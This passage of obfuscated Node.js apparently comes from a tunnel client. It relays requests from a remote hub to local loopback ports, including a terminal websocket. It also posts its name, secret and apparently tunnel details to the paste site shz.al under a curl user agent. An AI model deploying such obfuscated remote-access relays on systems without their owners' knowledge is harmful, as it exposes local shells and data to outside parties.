    }
    ['_sleepInterruptible'](a) {
        const b = {
            'xqJth': function (c, d) {
                return c >= d;
            },
            'tMrcb': function (c, d) {
                return c - d;
            },
            'uHoRT': function (c) {
                return c();
            },
            'oQEYX': function (c, d, f) {
                return c(d, f);
            }
        };
        return new Promise(c => {
            const lK = a0b, d = Date[lK(0x430)](), f = b['oQEYX'](setInterval, () => {
                    const lL = lK;
                    (this['_stopFlag'] || b[lL(0xa66)](b[lL(0x2a2)](Date[lL(0x430)](), d), a)) && (clearInterval(f), b[lL(0x1a8)](c));
                }, 0xfa);
        });
    }
    ['_connectOnce']() {
        const lM = a0d0, a = {
                'ZZnNE': function (b, c) {
                    return b(c);
                },
                'rlqqO': function (b) {
                    return b();
                },
                'reXYF': function (b, c) {
                    return b(c);
                },
                'TSShy': lM(0x75b),
                'mDXJd': function (b, c) {
                    return b !== c;
                },
                'CFKKd': 'unknown',
                'NRHsf': 'alive',
                'iDoyq': function (b) {
                    return b();
                },
                'vmrlp': 'req',
                'ZUKuT': 'ws_data',
                'RuxzY': lM(0xa72),
                'hveuO': lM(0x5e3),
                'imuCm': function (b, c) {
                    return b(c);
                },
                'jtwan': lM(0x588),
                'WeJTw': 'close',
                'qMrMC': lM(0x755)
            };
        return new Promise((b, c) => {
            const lN = lM, d = {
                    'WoSyN': a[lN(0xead)],
                    'ulpfW': lN(0x132),
                    'kExgS': function (o, p) {
                        const lO = lN;
                        return a[lO(0x86a)](o, p);
                    },
                    'xSFwl': function (o, p) {
                        const lP = lN;
                        return a[lP(0x9a4)](o, p);
                    },
                    'XScCA': a[lN(0xc8a)],
                    'nNlVP': a[lN(0x707)],
                    'XKEoI': function (o) {
                        return a['iDoyq'](o);
                    },
                    'QUrLu': function (o, p, q) {
                        return o(p, q);
                    },
                    'BNDMN': a[lN(0xe51)],
                    'oUcWS': a[lN(0x220)],
                    'DSGFP': a[lN(0xb39)],
                    'WLgeQ': function (o) {
                        const lQ = lN;
                        return a[lQ(0x800)](o);
                    },
                    'otCst': a[lN(0x82c)]
                }, f = a['imuCm'](a0aa, this['hubUrl']);
            let g;
            try {
                g = this[lN(0xe0e)] ? this['_wsFactory'](f) : new a0cG(f);
            } catch (o) {
                return a[lN(0x7d7)](c, o);
            }
            this[lN(0xe88)] = g;
            const h = new Map();
            let i = ![], j = ![], k = null;
            const l = () => {
                    const lR = lN;
                    k && (a['ZZnNE'](clearInterval, k), k = null);
                    for (const p of h[lR(0x543)]())
                        p[lR(0x7ef)]();
                    h[lR(0x13c)]();
                }, m = () => {
                    const lS = lN;
                    !i && (i = !![], l(), a[lS(0x93e)](b));
                }, n = p => {
                    const lT = lN;
                    !i && (i = !![], l(), a[lT(0x9a4)](c, p));
                };
            g['on'](a[lN(0xcc3)], () => {
                const lU = lN, p = {
                        't': lU(0x6b8),
                        'v': 0x1,
                        'kname': this[lU(0x973)],
                        'version': a0ax[lU(0x9c3)],
                        'ports': [...this[lU(0x7f0)]][lU(0xa25)]((q, r) => q - r)
                    };
                p[lU(0x580)] = this[lU(0xa19)] || this['hubUrl'], this[lU(0x173)](p);
            }), g['on'](lN(0xf18), (p, q) => {
                const lV = lN;
                if (q)
                    return;
                let r;
                try {
                    r = JSON[lV(0x766)](p[lV(0xa27)](d[lV(0x74f)]));
                } catch (s) {
                    return;
                }
                if (!j) {
                    if (d['kExgS'](r['t'], lV(0xaca)))
                        return;
                    if (!r['ok']) {
                        d[lV(0xb4d)](n, new a0aw(r[lV(0x46f)] || d[lV(0x28d)], r[lV(0xf18)] || ''));
                        return;
                    }
                    j = !![], this[lV(0xab3)] = d[lV(0x91a)], this[lV(0x531)] = 0x0, this[lV(0x409)] = null, this[lV(0xce4)] = d[lV(0x40f)](a0av), this[lV(0x6d3)][lV(0x6e3)]('[KMODE3]\x20✅\x20已连接\x20hub\x20'[lV(0x7b6)](this[lV(0x29a)], lV(0x7e3))['concat'](this[lV(0x973)], lV(0xac8))['concat'](this[lV(0x4f3)], ')')), k = d[lV(0x9f2)](setInterval, () => {
                        const lW = lV;
                        if (this[lW(0xb5b)] || g[lW(0x37e)] !== a0cG[lW(0xa42)])
                            return;
                        this[lW(0x173)]({ 't': d['WoSyN'] });
                    }, this[lV(0x643)]);
                    return;
                }
                switch (r['t']) {
                case lV(0x942):
                    break;
                case d['BNDMN']:
                    this[lV(0xbad)](r)[lV(0xef4)](() => {
                    });
                    break;
                case lV(0x9fa): {
                        const t = new a0cI(this, g, r['id'], r);
                        h[lV(0x6e7)](r['id'], t), t[lV(0xb58)]();
                        break;
                    }
                case d['oUcWS']: {
                        const u = h[lV(0xb2b)](r['id']);
                        if (u)
                            u[lV(0x673)](r);
                        break;
                    }
                case d[lV(0x8eb)]: {
                        const v = h[lV(0xb2b)](r['id']);
                        v && (h[lV(0xcd1)](r['id']), v['closeFromHub'](r));
                        break;
                    }
                default:
                    break;
                }
            }), g['on'](a[lN(0x231)], () => {
                const lX = lN;
                this[lX(0xe88)] = null;
                if (j)
                    d[lX(0x6fe)](m);
                else
                    n(new Error(d[lX(0xb8f)]));
            }), g['on'](a[lN(0x8f7)], p => {
                const lY = lN;
                if (!j)
                    a[lY(0x9a4)](n, p);
            });
        });
    }
    async [a0d0(0xbad)](a) {
        const lZ = a0d0, b = {
                'zyyEW': lZ(0x19e),
                'fNwvK': lZ(0xbf),
                'mLcUA': 'port',
                'mspZu': function (k, l, m) {
                    return k(l, m);
                },
                'OwwuH': function (k, l) {
                    return k(l);
                },
                'whRyM': lZ(0xed3),
                'zduPF': 'base64',
                'DPKlw': function (k, l) {
                    return k === l;
                },
                'GoJjV': 'body_too_large',
                'qszZS': 'loopback_unreachable',
                'ipfJB': function (k, l) {
                    return k(l);
                }
            }, c = a['id'], d = a['mode'] || b[lZ(0x186)], g = String(a[lZ(0xae)] || b[lZ(0x4c6)])[lZ(0x492)](), h = a['path'] || '/', i = a[lZ(0x302)] || '', j = a[lZ(0x5e6)] ? Buffer[lZ(0x58d)](a[lZ(0x5e6)], 'base64') : Buffer[lZ(0xacf)](0x0);
        this['relayCount'] += 0x1;
        try {
            let k, l;
            d === b[lZ(0xa32)] ? (k = b[lZ(0xb45)](parseInt, a['port'], 0xa) || 0x0, l = b[lZ(0x340)](a0aj, a0ad)) : (k = this[lZ(0x606)], l = null);
            const {
                status: m,
                headers: n,
                body: o
            } = await a0at({
                'port': k,
                'whitelist': l,
                'method': g,
                'path': h,
                'query': i,
                'headers': a[lZ(0xe76)],
                'body': j,
                'maxBody': this[lZ(0x825)],
                'relayTimeout': this[lZ(0xc0d)],
                'requestFn': this[lZ(0x520)] || undefined
            });
            this['_send']({
                't': b[lZ(0x788)],
                'id': c,
                'status': m,
                'headers': n,
                'body_b64': o['toString'](b[lZ(0xd98)])
            });
        } catch (p) {
            const q = p && p[lZ(0x5e2)] ? p[lZ(0x5e2)] : p && b[lZ(0xe1)](p[lZ(0x46f)], b[lZ(0xd39)]) ? 'body_too_large' : b[lZ(0xb3b)];
            this[lZ(0x162)](c, q, b[lZ(0xb79)](String, p && p['message'] || p)[lZ(0x174)](0x0, 0x12c));
        }
    }
    [a0d0(0x480)](a, b, c, d, f) {
        return a0ap(a, b, c, d, f, this['_maxBody']);
    }
    ['_sendErr'](a, b, c) {
        const m0 = a0d0, d = { 'MIEXY': 'err' };
        this['_send']({
            't': d[m0(0x348)],
            'id': a,
            'code': b,
            'message': c
        });
    }
}
class a0cI {
    constructor(a, b, c, d) {
        const m1 = a0d0, g = {
                'IXzdl': '/api/ws/terminal',
                'WbDJl': function (i, j, l) {
                    return i(j, l);
                },
                'zmIAi': function (i, j) {
                    return i(j);
                }
            };
        this['mgr'] = a, this[m1(0x4e3)] = b, this[m1(0x578)] = c, this[m1(0xda2)] = d[m1(0xda2)] || g['IXzdl'], this[m1(0x302)] = d['query'] || '', this[m1(0x606)] = g[m1(0xb8a)](parseInt, d['port'], 0xa) || 0x0;
        const h = {};
        for (const [i, j] of Object[m1(0x471)](g[m1(0x7ab)](a0ab, d['headers']))) {
            if (!i[m1(0x777)]()[m1(0x46a)]('sec-websocket-'))
                h[i] = j;
        }
        this[m1(0xe76)] = h, this[m1(0xf1b)] = null, this['stopped'] = ![], this['_pendingFromHub'] = [];
    }
    [a0d0(0xb58)]() {
        const m2 = a0d0, a = {
                'AZCgo': m2(0x975),
                'IUjat': m2(0x26e),
                'hVQWU': m2(0xe5d),
                'JOQSA': m2(0xa1f),
                'Xdzru': 'base64',
                'VZRUJ': function (g, h) {
                    return g(h);
                },
                'jEYEf': m2(0xa72),
                'tRHRW': function (g, h) {
                    return g || h;
                },
                'fBYxS': function (g, h) {
                    return g + h;
                },
                'MWgpy': function (g, h) {
                    return g(h);
                },
                'yPQEo': m2(0xf18),
                'HyWBt': m2(0x755)
            };
        if (this['port'] && !a0aj(a0ad)['includes'](this[m2(0x606)])) {
            this[m2(0x240)] = !![], this[m2(0xc9)]['_send']({
                't': m2(0x975),
                'id': this['sid'],
                'ok': ![],
                'message': '端口\x20'[m2(0x7b6)](this[m2(0x606)], m2(0xe54))
            });
            return;
        }
        const b = this[m2(0x606)] || this['mgr']['port'], c = 'ws://127.0.0.1:'[m2(0x7b6)](b)[m2(0x7b6)](this[m2(0xda2)])['concat'](this[m2(0x302)] ? a[m2(0x88d)]('?', this[m2(0x302)]) : '');
        let d;
        try {
            d = this[m2(0xc9)][m2(0xe0e)] ? this[m2(0xc9)][m2(0xe0e)](c) : new a0cG(c, { 'headers': this['headers'] });
        } catch (g) {
            this[m2(0x240)] = !![], this['mgr']['_send']({
                't': a[m2(0x838)],
                'id': this[m2(0x578)],
                'ok': ![],
                'message': a['MWgpy'](String, g[m2(0xf18)] || g)['slice'](0x0, 0xc8)
            });
            return;
        }
        this[m2(0xf1b)] = d;
        let f = ![];
        d['on']('open', () => {
            const m3 = m2;
            f = !![], this[m3(0xc9)][m3(0x173)]({
                't': a['AZCgo'],
                'id': this[m3(0x578)],
                'ok': !![]
            }), this[m3(0x9d9)]();
        }), d['on'](a[m2(0x822)], (h, i) => {
            const m4 = m2;
            this[m4(0xc9)][m4(0x173)]({
                't': a[m4(0xa05)],
                'id': this[m4(0x578)],
                'bt': i ? a['hVQWU'] : a['JOQSA'],
                'data_b64': Buffer['from'](h)['toString'](a[m4(0xb00)])
            });
        }), d['on'](a[m2(0xae0)], h => {
            const m5 = m2;
            !f && !this['stopped'] && (this['stopped'] = !![], this[m5(0xc9)][m5(0x173)]({
                't': a[m5(0x838)],
                'id': this[m5(0x578)],
                'ok': ![],
                'message': a[m5(0xa1b)](String, h[m5(0xf18)] || h)[m5(0x174)](0x0, 0xc8)
            }));
        }), d['on'](m2(0xd81), (h, i) => {
            const m6 = m2;
            if (this[m6(0x240)])
                return;
            this[m6(0x240)] = !![], this[m6(0xc9)][m6(0x173)]({
                't': a[m6(0x3c0)],
                'id': this[m6(0x578)],
                'ws_code': a[m6(0x6c0)](h, 0x3e8),
                'reason': i ? i[m6(0xa27)]() : m6(0x85c)
            });
        });
    }
    [a0d0(0x673)](a) {
        const m7 = a0d0, b = {
                'GOEBm': function (c, d) {
                    return c === d;
                }
            };
        if (this[m7(0x240)])
            return;
        if (!this['localWs'] || this[m7(0xf1b)][m7(0x37e)] !== a0cG[m7(0xa42)]) {
            this[m7(0xf1b)] && b['GOEBm'](this[m7(0xf1b)][m7(0x37e)], a0cG['CONNECTING']) && this['_pendingFromHub'][m7(0x59a)](a);
            return;
        }
        this[m7(0x9d9)](), this[m7(0x7b1)](a);
    }
    [a0d0(0x9d9)]() {
        const m8 = a0d0, a = {
                'ynrmA': function (b, c) {
                    return b === c;
                }
            };
        while (this['_pendingFromHub'][m8(0x615)] && this['localWs'] && a[m8(0xe43)](this['localWs'][m8(0x37e)], a0cG[m8(0xa42)])) {
            this[m8(0x7b1)](this[m8(0xbd5)][m8(0x99b)]());
        }
    }
    [a0d0(0x7b1)](a) {
        const m9 = a0d0, b = {
                'tLbSj': m9(0xc75),
                'bIttM': m9(0x132)
            }, c = Buffer[m9(0x58d)](a[m9(0xab4)] || '', b['tLbSj']);
        if (a['bt'] === m9(0xe5d))
            this[m9(0xf1b)]['send'](c, { 'binary': !![] });
        else
            this[m9(0xf1b)][m9(0xb36)](c[m9(0xa27)](b[m9(0x11b)]), { 'binary': ![] });
    }
    [a0d0(0x563)](a) {
        const ma = a0d0, b = {
                'Tytwe': function (c, d) {
                    return c(d);
                }
            };
        this[ma(0x240)] = !![];
        if (this['localWs'] && this[ma(0xf1b)][ma(0x37e)] === a0cG[ma(0xa42)])
            try {
                this[ma(0xf1b)]['close'](0x3e8, Buffer[ma(0x58d)](b['Tytwe'](String, a[ma(0x9d6)] || '')));
            } catch (c) {
            }
    }
    [a0d0(0x7ef)]() {
        const mb = a0d0, a = {
                'bBcvj': function (b, c) {
                    return b !== c;
                }
            };
        this[mb(0x240)] = !![];
        if (this[mb(0xf1b)] && a[mb(0x36a)](this[mb(0xf1b)][mb(0x37e)], a0cG['CLOSED']))
            try {
                this[mb(0xf1b)]['close'](0x3e9);
            } catch (b) {
            }
    }
}
class a0cJ {
    constructor(a) {
        const mc = a0d0;
        this[mc(0xf6)] = new Map(), this['log'] = a || a0R, this[mc(0xaa3)] = null;
    }
    async ['register'](a, b, c, d = a0d0(0x89b), f = 0x3a98) {
        const md = a0d0, g = {
                'qkAyu': function (n, o) {
                    return n(o);
                },
                'iECJX': function (n, o) {
                    return n || o;
                },
                'iWdzF': function (n, o) {
                    return n || o;
                },
                'XSjHS': md(0xdca),
                'ErZJb': md(0x15a),
                'cpYHl': md(0xddc),
                'BdZLy': function (n, o) {
                    return n instanceof o;
                },
                'QSRLC': md(0x3ee),
                'AHwrW': md(0xdfd),
                'HFQZD': function (n, o) {
                    return n(o);
                },
                'MVJyX': md(0xcef)
            }, h = g[md(0xe92)](a0a7, b);
        if (h)
            return {
                'snapshot': {
                    'kname': g[md(0x890)](b, '')[md(0x27f)]()['toLowerCase'](),
                    'hub': g[md(0x8a1)](a, '')[md(0x27f)]()['replace'](/\/+$/, ''),
                    'source': d,
                    'tunnel_status': g['XSjHS'],
                    'ports': [...c || []][md(0xa25)]((n, o) => n - o)
                },
                'code': 'invalid_name',
                'message': h
            };
        const i = b[md(0x27f)]()['toLowerCase']();
        if (this[md(0xf6)][md(0xbe6)](i))
            return {
                'snapshot': this[md(0xf6)][md(0xb2b)](i)[md(0x235)](),
                'code': g[md(0xdce)],
                'message': g[md(0xc9f)]
            };
        const j = this[md(0xaa3)] ? this[md(0xaa3)](a, b, a0ax[md(0xb49)], c, this[md(0x6d3)], d) : new a0cH(a, b, a0ax[md(0xb49)], c, this['log'], d);
        j[md(0xb58)]();
        const {
            ok: k,
            err: l
        } = await j['waitConnected'](f);
        if (k)
            return this['items']['set'](i, j), {
                'snapshot': j[md(0x235)](),
                'code': null,
                'message': null
            };
        if (g[md(0xc5)](l, a0aw)) {
            j[md(0x7ef)]();
            const n = j[md(0x235)]();
            return n[md(0x33b)] = g[md(0x8ae)], {
                'snapshot': n,
                'code': l[md(0x46f)],
                'message': l[md(0xf18)]
            };
        }
        const m = j[md(0x235)]();
        return m[md(0x33b)] = g[md(0x972)], this['items'][md(0x6e7)](i, j), {
            'snapshot': m,
            'code': g['AHwrW'],
            'message': g['HFQZD'](String, l && l[md(0xf18)] || g[md(0x17d)])
        };
    }
    [a0d0(0x513)](a) {
        const me = a0d0, b = {
                'tDCjT': function (g, h) {
                    return g || h;
                }
            }, c = b['tDCjT'](a, '')[me(0x27f)]()[me(0x777)](), d = this[me(0xf6)][me(0xb2b)](c);
        if (!d)
            return null;
        const f = d[me(0x235)]();
        return this[me(0xf6)][me(0xcd1)](c), d[me(0x7ef)](), f;
    }
    [a0d0(0xb2b)](a) {
        const mf = a0d0, b = {
                'AhKoj': function (c, d) {
                    return c || d;
                }
            };
        return this[mf(0xf6)]['get'](b[mf(0x9af)](a, '')[mf(0x27f)]()['toLowerCase']()) || null;
    }
    [a0d0(0xcca)]() {
        const mg = a0d0;
        return [...this[mg(0xf6)][mg(0x543)]()][mg(0x9c5)](a => a[mg(0x235)]());
    }
    [a0d0(0x886)]() {
        const mh = a0d0;
        for (const a of this[mh(0xf6)][mh(0x543)]())
            a[mh(0x7ef)]();
        this['items'][mh(0x13c)]();
    }
}
class a0cK {
    static [a0d0(0x355)] = ![];
    static [a0d0(0xab2)] = null;
    static [a0d0(0xef5)] = /^[A-Za-z0-9+_\-*$=@,;[/\]]+$/;
    static [a0d0(0x5b9)] = ![];
    static [a0d0(0xc2a)]() {
        const mi = a0d0, a = {
                'iftKd': function (g, h) {
                    return g < h;
                },
                'sCstN': mi(0xb57),
                'ywukp': mi(0x9cc),
                'LmVhg': function (g, h) {
                    return g + h;
                },
                'OQepv': function (g, h) {
                    return g || h;
                },
                'enOKB': mi(0xcf6),
                'aHsAm': mi(0x49f),
                'WmrTj': '[KMODE]\x20💡\x20修正:\x20设置\x20≥8\x20字符的\x20KNAME\x20且\x20(可选)\x20KNAME_KEY\x20≥8\x20字符,\x20例如:\x20KNAME=myname\x20KNAME_KEY=mysecret-pass'
            }, b = a0ax['KNAME'] || '', c = a0ax[mi(0x9cc)] || a0ax[mi(0x39e)] || '', d = [];
        if (a[mi(0x6f3)](b[mi(0x615)], 0x3))
            d['push'](mi(0xa3)[mi(0x7b6)](b[mi(0x615)], '<3)'));
        if (!this[mi(0xef5)][mi(0xdbb)](b))
            d[mi(0x59a)](a[mi(0xc26)]);
        if (c[mi(0x615)] < 0x8)
            d[mi(0x59a)](mi(0xdba)['concat'](c['length'], '<8,\x20实际使用\x20')['concat'](a0ax[mi(0x9cc)] ? a['ywukp'] : mi(0x39e), ')'));
        const f = d[mi(0x615)] === 0x0;
        return !f && !this[mi(0x5b9)] && (this[mi(0x5b9)] = !![], a0R[mi(0x6e3)](a[mi(0x5e7)]('[KMODE]\x20⚠️\x20KMODE=2\x20未生效,\x20条件不满足:\x20'[mi(0x7b6)](d[mi(0x782)](';\x20'), '\x20'), '(KNAME='[mi(0x7b6)](a[mi(0x451)](b, a['enOKB']), ',\x20KNAME_KEY=')[mi(0x7b6)](a0ax[mi(0x9cc)] ? mi(0xd2f)['concat'](a0ax[mi(0x9cc)][mi(0x615)], ')') : a[mi(0xd08)], ')'))), a0R[mi(0x6e3)](a[mi(0xcb3)])), f;
    }
    static ['reportShzalDebug']() {
        const mj = a0d0, a = {
                'lqANW': function (b, c) {
                    return b === c;
                },
                'NxLrN': function (b, c) {
                    return b(c);
                },
                'HRPJc': mj(0xd97)
            };
        return a0ax[mj(0x892)] || a[mj(0x61b)](a[mj(0x331)](String, process.env.SHZAL_DEBUG || '')[mj(0x777)](), a[mj(0x791)]);
    }
    static [a0d0(0x58c)](a, b = null, c = null) {
        const mk = a0d0, d = {
                'EmDpH': function (i, j) {
                    return i + j;
                },
                'DWmnI': mk(0x65c),
                'lCIjP': function (i, j) {
                    return i + j;
                },
                'gGtwL': mk(0x755),
                'CYLiU': function (i, j) {
                    return i === j;
                },
                'PVhVp': function (i, j) {
                    return i(j);
                },
                'bViWG': mk(0xc72),
                'iJkhG': '名字被占用,\x20改用\x20PUT\x20覆盖:\x20https://shz.al/~',
                'oRzVt': function (i, j, k, l, m) {
                    return i(j, k, l, m);
                },
                'YAnEV': mk(0xef0),
                'SKtQS': function (i, j) {
                    return i !== j;
                },
                'FWKqd': function (i, j) {
                    return i + j;
                },
                'bBVyV': mk(0x4df),
                'Jdgvv': mk(0x7c7),
                'kIwrv': mk(0x42c),
                'tpJCZ': function (i, j) {
                    return i > j;
                },
                'pIgqn': function (i, j) {
                    return i(j);
                }
            }, f = this[mk(0x4b1)](), g = i => {
                const ml = mk;
                if (f)
                    a0R[ml(0xb89)](d[ml(0xa64)](ml(0xbdc), i));
            }, h = d['CYLiU'](b, null);
        return new Promise(i => {
            const mm = mk, j = {
                    'oVfgL': d[mm(0x2fd)],
                    'ucEYA': function (q, r) {
                        return q(r);
                    },
                    'Rvjer': function (q, r) {
                        const mn = mm;
                        return d[mn(0x6d2)](q, r);
                    },
                    'fUuTl': function (q, r) {
                        const mo = mm;
                        return d[mo(0x6d2)](q, r);
                    },
                    'ekPuh': function (q, r) {
                        return q + r;
                    },
                    'XTvRc': function (q, r) {
                        return d['EmDpH'](q, r);
                    },
                    'ksQmh': function (q, r) {
                        return q + r;
                    },
                    'oHAXt': d[mm(0x450)],
                    'mjsYu': function (q, r) {
                        const mp = mm;
                        return d[mp(0xaad)](q, r);
                    },
                    'nyzht': '\x20(失败)',
                    'xCeAP': function (q, r) {
                        const mq = mm;
                        return d[mq(0x98b)](q, r);
                    },
                    'zXfAf': d[mm(0xaaa)],
                    'IWkag': function (q, r) {
                        return q === r;
                    },
                    'zLWrj': d['iJkhG'],
                    'xEEGn': function (q, r, s, t, u) {
                        const mr = mm;
                        return d[mr(0x50c)](q, r, s, t, u);
                    },
                    'ZUSCj': function (q, r) {
                        const ms = mm;
                        return d[ms(0x98b)](q, r);
                    },
                    'cowlM': function (q, r) {
                        return d['CYLiU'](q, r);
                    },
                    'GvNNh': d[mm(0x5a0)],
                    'MKbNc': function (q, r) {
                        const mt = mm;
                        return d[mt(0x98b)](q, r);
                    },
                    'heDBW': function (q, r) {
                        const mu = mm;
                        return d[mu(0x6d2)](q, r);
                    }
                }, k = d[mm(0xc5d)](b, null) ? b : a0ax[mm(0x39e)], l = d[mm(0xc5d)](c, null) ? c : a0ax[mm(0x9cc)] || a0ax[mm(0x39e)], m = d[mm(0xbd)](d[mm(0xe3)], a0k['randomBytes'](0xc)['toString']('hex')), n = [
                    [
                        'c',
                        a
                    ],
                    [
                        'n',
                        k
                    ],
                    [
                        's',
                        l
                    ],
                    [
                        'e',
                        '7d'
                    ]
                ], o = q => {
                    const mv = mm, r = q[mv(0x9c5)](([s, t]) => Buffer[mv(0x58d)]('--'['concat'](m, mv(0xabd))['concat'](s, mv(0x9c6))[mv(0x7b6)](t, '\x0d\x0a')));
                    return r[mv(0x59a)](Buffer['from']('--'[mv(0x7b6)](m, mv(0x322)))), Buffer[mv(0x7b6)](r);
                }, p = (q, r, s, t) => {
                    const mw = mm, v = {
                            'YCFDn': j[mw(0x517)],
                            'qfMPD': function (y, z) {
                                const mx = mw;
                                return j[mx(0x750)](y, z);
                            },
                            'uAsMY': function (z, A) {
                                const my = mw;
                                return j[my(0x604)](z, A);
                            },
                            'ijHWQ': function (z, A) {
                                const mz = mw;
                                return j[mz(0x3b1)](z, A);
                            },
                            'tYQzh': function (z, A) {
                                const mA = mw;
                                return j[mA(0x15b)](z, A);
                            },
                            'BitGi': function (z, A) {
                                const mB = mw;
                                return j[mB(0xaf7)](z, A);
                            }
                        }, w = new URL(q), x = a0h[mw(0x6be)]({
                            'hostname': w['hostname'],
                            'port': w['port'] || 0x1bb,
                            'path': j[mw(0x985)](w[mw(0x372)], w['search']),
                            'method': s,
                            'headers': {
                                'Content-Type': 'multipart/form-data;\x20boundary='[mw(0x7b6)](m),
                                'Content-Length': r ? r[mw(0x615)] : 0x0,
                                'User-Agent': 'curl/8.5.0'
                            }
                        }, y => {
                            const mC = mw;
                            y[mC(0xd53)](), y['on'](v['YCFDn'], () => t(y['statusCode']));
                        });
                    x['on'](j['oHAXt'], y => {
                        const mD = mw;
                        v[mD(0x1d9)](g, v['uAsMY'](v[mD(0xe10)](v[mD(0x660)](v[mD(0xa08)](s, '\x20'), q), mD(0xa22)), y[mD(0xf18)])), t(0x0);
                    }), x[mw(0xdb6)](0x7530, () => x[mw(0x4d7)](new Error(mw(0xed4))));
                    if (r)
                        x['write'](r);
                    x[mw(0x65c)]();
                };
            g(d['EmDpH'](d['Jdgvv'] + k, d['kIwrv']) + d['tpJCZ'](l[mm(0x615)], 0x0) + ')');
            try {
                d['oRzVt'](p, 'https://shz.al/', d[mm(0x177)](o, n), mm(0xfb), q => {
                    const mE = mm;
                    g(j[mE(0x15b)](j[mE(0xf28)], q));
                    if (j['IWkag'](q, 0x199)) {
                        g(j[mE(0xaf7)](j[mE(0x3f6)] + k, ':*'));
                        const r = n['filter'](([s]) => s !== 'n');
                        j[mE(0x9b1)](p, 'https://shz.al/~'[mE(0x7b6)](k, ':')[mE(0x7b6)](l), j['ZUSCj'](o, r), mE(0x4e7), s => {
                            const mF = mE;
                            j[mF(0x750)](g, mF(0x4d2) + s + (j[mF(0xf21)](s, 0xc8) ? mF(0xf3) : j[mF(0x27d)])), j['xCeAP'](i, j[mF(0xf21)](s, 0xc8));
                        });
                    } else
                        j[mE(0x73c)](q, 0xc8) ? (g(j[mE(0x971)]), j[mE(0x679)](i, !![])) : (g(j['heDBW'](j[mE(0x604)](mE(0x6d0), q), ')')), j[mE(0x750)](i, ![]));
                });
            } catch (q) {
                g(d[mm(0xbd)](mm(0x2c8), q[mm(0xf18)])), d[mm(0x98b)](i, ![]);
            }
        })[mk(0x9f0)](i => {
            const mG = mk;
            if (i && h)
                this[mG(0xab2)] = a;
            return i;
        })['catch'](() => ![]);
    }
    static async [a0d0(0xe9f)](a, b = null, c = null) {
        const mH = a0d0, d = {
                'eICFl': function (f, g) {
                    return f <= g;
                },
                'cASdE': function (f, g) {
                    return f < g;
                }
            };
        for (let f = 0x1; d[mH(0xd1a)](f, 0x3); f++) {
            if (await this['reportShzal'](a, b, c))
                return;
            d[mH(0x6cb)](f, 0x3) && await new Promise(g => setTimeout(g, 0x3e8 * 0x2 ** f));
        }
    }
    static ['deleteShzal'](a, b) {
        const mI = a0d0, c = {
                'RWrEj': function (g, h) {
                    return g + h;
                },
                'mDlKA': 'end',
                'bDHja': function (g, h) {
                    return g(h);
                },
                'UKitk': function (g, h) {
                    return g + h;
                },
                'qKPFC': mI(0x285),
                'MDchQ': 'curl/8.5.0'
            }, d = this[mI(0x4b1)](), f = g => {
                const mJ = mI;
                if (d)
                    a0R[mJ(0xb89)](c[mJ(0x2f0)]('[KMODE:shz.al]\x20', g));
            };
        return new Promise(g => {
            const mM = mI, h = {
                    'laPhV': function (k, l) {
                        const mK = a0b;
                        return c[mK(0x964)](k, l);
                    },
                    'nijpv': function (k, l) {
                        const mL = a0b;
                        return c[mL(0xbd4)](k, l);
                    },
                    'SmOOg': mM(0x66d)
                }, i = new URL('https://shz.al/~'[mM(0x7b6)](a, ':')[mM(0x7b6)](b)), j = a0h[mM(0x6be)]({
                    'hostname': i[mM(0x1de)],
                    'port': i['port'] || 0x1bb,
                    'path': c['RWrEj'](i[mM(0x372)], i[mM(0x9e6)]),
                    'method': c['qKPFC'],
                    'headers': { 'User-Agent': c[mM(0x59e)] }
                }, k => {
                    const mN = mM;
                    k[mN(0xd53)](), k['on'](c['mDlKA'], () => g(k[mN(0x12e)] === 0xc8));
                });
            j['on'](mM(0x755), k => {
                const mO = mM;
                h[mO(0xe15)](f, h[mO(0xcd5)](h[mO(0x305)], k[mO(0xf18)])), g(![]);
            }), j[mM(0xdb6)](0x7530, () => j[mM(0x4d7)](new Error(mM(0xed4)))), j['end']();
        });
    }
    static ['homeDir']() {
        const mP = a0d0, a = [
                process.env.USERPROFILE,
                process.env.HOME
            ];
        for (const b of a) {
            if (b && a0l[mP(0x7d2)](b) && a0l[mP(0x9a5)](b)[mP(0xa43)]())
                return b;
        }
        try {
            return a0p[mP(0x8d1)]();
        } catch (c) {
            return process[mP(0xc50)]();
        }
    }
    static [a0d0(0xe20)]() {
        const mQ = a0d0, a = {
                'xxyjx': mQ(0xde6),
                'Zbtbt': mQ(0x5d7)
            };
        let b = (a0ax['KPATH'] || '')[mQ(0x27f)]();
        if (!b)
            return a0o[mQ(0x782)](this[mQ(0x22f)](), a[mQ(0xc8f)]);
        if (b[mQ(0x46a)](a['Zbtbt']))
            b = b[mQ(0x615)] > 0x5 ? a0o[mQ(0x782)](this[mQ(0x22f)](), b[mQ(0x174)](0x5)['replace'](/^[/\\]+/, '')) : this[mQ(0x22f)]();
        else
            b[mQ(0x46a)]('~') && (b = a0o[mQ(0x983)](b[mQ(0xde0)](/^~(?=[/\\]|$)/, this[mQ(0x22f)]())));
        return b;
    }
    static [a0d0(0xd23)](a) {
        const mR = a0d0;
        this[mR(0xab2)] = a;
        const b = this['resolveDomainFilePath']();
        try {
            a0l['mkdirSync'](a0o[mR(0x6af)](a0o[mR(0x983)](b)), { 'recursive': !![] }), a0l['writeFileSync'](b, a), a0R['info']('[KMODE]\x20📄\x20隧道域名已写入:\x20'['concat'](b));
        } catch (c) {
            a0R['warn'](mR(0x9e1)['concat'](b, mR(0x5c8))[mR(0x7b6)](c['message']));
        }
    }
    static [a0d0(0x570)]() {
        const mS = a0d0, a = this[mS(0xe20)]();
        try {
            a0l['existsSync'](a) && a0l[mS(0x9a5)](a)[mS(0xdf2)]() && (a0l[mS(0xa78)](a), a0R[mS(0x6e3)]('[KMODE]\x20🗑️\x20域名文件已删除:\x20'[mS(0x7b6)](a)));
        } catch (b) {
            a0R['warn'](mS(0xe7)['concat'](a, mS(0x5c8))[mS(0x7b6)](b[mS(0xf18)]));
        }
    }
    static ['onBaseinfoSuccess']() {
        const mT = a0d0;
        !this[mT(0x355)] && (this[mT(0x355)] = !![], this[mT(0x570)]());
    }
    static ['startStdinListener']() {
        const mU = a0d0, a = {
                'EvvRb': function (b, c) {
                    return b === c;
                },
                'UvqjX': mU(0x823),
                'chvpk': mU(0x69c),
                'qNFiG': mU(0x12d),
                'JKtvT': 'close',
                'KukrH': mU(0x755)
            };
        try {
            const b = a0q['createInterface']({
                'input': process[mU(0xe84)],
                'terminal': ![]
            });
            b['on'](a['qNFiG'], c => {
                const mV = mU;
                a[mV(0xdf0)](c[mV(0x27f)](), a[mV(0x793)]) && console['log'](this[mV(0xab2)] || a[mV(0x7d5)]);
            }), b['on'](a['JKtvT'], () => {
